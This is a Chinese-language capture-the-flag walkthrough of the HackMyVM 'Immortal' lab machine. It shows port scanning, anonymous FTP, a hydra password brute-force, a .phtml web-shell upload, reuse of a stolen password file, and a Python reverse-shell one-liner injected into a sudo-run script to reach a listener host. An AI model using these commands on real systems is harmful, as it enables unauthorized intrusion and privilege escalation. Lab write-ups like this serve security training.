---
sidebar_position: 3
tags: [Easy, Linux, FTP, SSH, Credential Cracking, 文件上传, SUDO, .service]
title: Immortal
---
# Immortal
## 端口扫描
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# nmap -sTCV -p- --min-rate 1000 192.168.0.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 02:18 EDT
Nmap scan report for 192.168.0.102 (192.168.0.102)
Host is up (0.0022s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             504 Feb 27 22:03 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-bounce: bounce working!
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 e8:79:ad:8b:d1:a8:39:1b:ac:ed:52:ef:d0:22:0e:eb (RSA)
|   256 65:df:6d:1d:49:11:bd:f3:2f:fa:10:0c:3b:48:69:39 (ECDSA)
|_  256 f6:b7:bf:cf:a5:d5:1b:26:4e:13:08:31:07:d5:79:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Password
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## FTP - 21
当我看见 FTP 的时候本能反应尝试 FTP 匿名身份登陆, 发现可以登陆并从其中获取到一些信息, 但是很可惜这是一个提示消息
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# ftp 192.168.0.102
Connected to 192.168.0.102.
220 (vsFTPd 3.0.3)
Name (192.168.0.102:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50560|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             504 Feb 27 22:03 message.txt

┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# cat message.txt 
Hey guys!
I made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. 
Now we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. 
They may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! 
Wishing you a long life, David.
```
:::info
- [x] 从中我获取到一个用户名 : `David`
:::
## HTTP - 80
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412142800.png)
访问 HTTP 服务, 我发现就是一个单纯的密码登陆, 我使用了目录扫描也没有找见, 所以我计划使用爆破手段, 万幸爆破到了
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# hydra -l admin  -P /usr/share/wordlists/rockyou.txt 192.168.0.102 http-post-form "/:password=^PASS^:Incorrect credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-12 02:27:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.0.102:80/:password=^PASS^:Incorrect credentials
[80][http-post-form] host: 192.168.0.102   login: admin   password: santiago
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-12 02:27:23
```
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412142919.png)
之后查看其中的文件, 在 chat 中我发现了一些特殊的位置, 告诉了我一个新的文件上传的位置
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412143047.png)
直接访问这个地址, 然后上传 ReverseShell, 但是存在过滤, 尝试了很久发现白名单是 `.phtml` , 上传后随后在 `chat` 中发现了对应的 WebShell
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412150912.png)
## 后渗透
### www-data --> drake
在用户 `drake` 的家目录中发现了一个密码文件 (这个目录比较特殊, 刚开始都没发现)
```bash
(remote) www-data@Immortal:/home/drake/...$ cat pass.txt 
netflix : drake123
amazon : 123drake
shelldred : shell123dred (f4ns0nly)
system : kevcjnsgii
bank : myfavouritebank
nintendo : 123456
```
随后使用这个构造一个字典开始爆破 SSH 密码
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412153307.png)
### drake --> eric
登陆之后发现用户 drake 具有特殊权限, 并且这个对应的文件也是有修改权限的
```bash
drake@Immortal:/home$ sudo -l
Matching Defaults entries for drake on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drake may run the following commands on Immortal:
    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py
drake@Immortal:/home$ ls -al /opt/immortal.py 
-rw-rw-rw- 1 root root 147 Feb 28 20:20 /opt/immortal.py
drake@Immortal:/home$ cat /opt/immortal.py 
a = input(str("Do you want to be immortal: "))

if a.lower() == "yes" or a.lower() == "no":
   print("Bad answer")
else:
   print("Are you sure?")
drake@Immortal:/home$
```
直接修改原 py 文件, 让其产生一个反向 Shell
```bash
(remote) drake@Immortal:/home$ cat << EOF > /opt/immortal.py 
> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.103",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
> EOF
(remote) drake@Immortal:/home$ sudo -u eric /usr/bin/python3 /opt/immortal.py
```
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412154018.png)
### eric --> root
直接查看用户权限, 发现这个用户权限是管理一个服务, 直接提权
```bash
(remote) eric@Immortal:/home$ sudo -l
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
```
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412154326.png)
随后直接执行即可
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412154416.png)